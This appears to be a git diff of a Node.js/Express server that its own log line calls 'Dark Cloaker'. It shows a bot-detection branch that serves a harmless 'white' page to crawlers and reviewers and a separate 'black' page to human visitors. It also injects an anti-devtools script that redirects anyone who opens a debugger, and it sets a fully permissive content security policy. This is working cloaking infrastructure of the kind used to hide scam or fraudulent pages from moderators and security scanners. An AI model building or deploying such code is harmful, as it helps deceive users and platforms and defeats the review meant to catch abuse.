@@ -3,28 +3,28 @@ const express = require("express");
 const mongoose = require("mongoose");
 const cors = require("cors");
 const helmet = require("helmet");
-const axios = require("axios");
+const path = require("path");
+
 const { isBot } = require("./utils/botDetection");
-const { mutateHTMLSafe } = require("./utils/mutator");
 const Domain = require("./models/Domain");
 
 const app = express();
-const path = require("path");
 
-// 🛡 Segurança digital
+// 🛡 Segurança
 app.use(cors());
 app.use(helmet());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// 🗂 Serve arquivos estáticos locais (sem CORS, sem proxy)
-app.use("/assets", express.static(path.join(__dirname, "public", "assets")));
+// 🗂️ Serve arquivos estáticos das pastas white e black
+app.use("/white", express.static(path.join(__dirname, "public", "white")));
+app.use("/black", express.static(path.join(__dirname, "public", "black")));
 
-// 🔗 Rotas de API
+// 🔗 Rotas da API (auth e domínio continuam funcionais)
 app.use("/api/auth", require("./routes/auth.routes"));
 app.use("/api/domain", require("./routes/domain.routes"));
 
-// 🔌 Conexão com MongoDB
+// 🔌 Conexão Mongo
 (async () => {
   try {
     await mongoose.connect(process.env.MONGO_URI);
@@ -35,72 +35,55 @@ app.use("/api/domain", require("./routes/domain.routes"));
   }
 })();
 
-// 🎭 Middleware universal de cloaking + injeção
-app.use(async (req, res, next) => {
+// 🎭 Middleware final de cloaking renderizando HTML local
+app.get("*", async (req, res) => {
   try {
     const host = req.hostname;
     const ua = req.headers["user-agent"] || "";
     const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
-    const urlPath = req.originalUrl;
 
+    // 📦 Busca o domínio no Mongo (opcional — pode tirar se quiser fixar os paths)
     const domain = await Domain.findOne({ officialUrl: `https://${host}` });
     if (!domain) return res.redirect("https://google.com");
 
+    // 👁️ Detecta se é um bot
     const isBotVisit = isBot(ua, ip);
-    const targetUrl = isBotVisit ? domain.baseUrl : domain.realUrl;
-    const fullUrl = `${targetUrl}${urlPath}`;
 
-    // 🔎 Detecta se é asset (mas agora servimos local!)
-    const isAsset = /\.(js|css|png|jpe?g|gif|svg|woff2?|ttf|eot|ico|json|txt|webp|mp4|map)(\?.*)?$/.test(urlPath);
-    if (isAsset) return next(); // deixa o express.static cuidar
+    // 📍 Define o caminho local do HTML a ser servido
+    const htmlPath = isBotVisit
+      ? path.join(__dirname, "public", "white", "index.html")
+      : path.join(__dirname, "public", "black", "index.html");
 
-    // 📡 Requisição do HTML do site real (para humano)
-    const headers = {
-      "User-Agent": ua,
-      "X-Forwarded-For": ip,
-      Referer: req.get("referer") || "",
-    };
+    // 💣 Anti-devtools: injetado no HTML antes de enviar (opcional)
+    const fs = require("fs");
+    let html = fs.readFileSync(htmlPath, "utf-8");
 
-    const response = await axios.get(fullUrl, { headers });
-    let html = response.data;
-
-    // 🛡 Anti-clonagem e anti-devtools
-    const antiDebug = `
+    const antiDebugScript = `
       <script>
         function devtoolsDetector() {
           const s = performance.now(); debugger; const e = performance.now();
-          if (e - s > 100) window.location.href = '${domain.fallbackUrl}';
+          if (e - s > 100) location.href = '${domain.fallbackUrl}';
         }
         setInterval(devtoolsDetector, 2000);
       </script>
     `;
 
-    // 🧬 Mutação: caminhos + CSP + injeções
-    html = mutateHTMLSafe(html);
+    html = html.replace("</body>", `${antiDebugScript}</body>`);
 
-    
-    // Corrige só se NÃO começar com /assets/
-    // Corrige apenas caminhos que não começam com / ou http
-    html = html.replace(/(src|href)=["'](?!https?:\/\/|\/)(\.?\/)?assets\//g, `$1="/assets/`);
-
-
-    html = html.replace("</body>", `${antiDebug}</body>`);
-
-    // Cabeçalhos finais
+    // 🧬 Cabeçalhos padrão
     res.setHeader("Content-Type", "text/html; charset=utf-8");
     res.setHeader("Access-Control-Allow-Origin", "*");
     res.setHeader("Content-Security-Policy", "default-src * data: blob: 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline'; img-src * data: blob:; font-src * data:");
 
     return res.send(html);
-
   } catch (err) {
-    console.error("❌ Erro proxy blindado:", err.message);
+    console.error("❌ Erro ao renderizar página local:", err.message);
     return res.redirect("https://google.com");
   }
 });
 
-// 🚀 Start do servidor
+// ☠️ Start
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, () => {
-  console.log(`☠️ Dark Cloaker rodando blindado na porta ${PORT}`);
+  console.log(`☠️ Dark Cloaker rodando na porta ${PORT}`);
 });
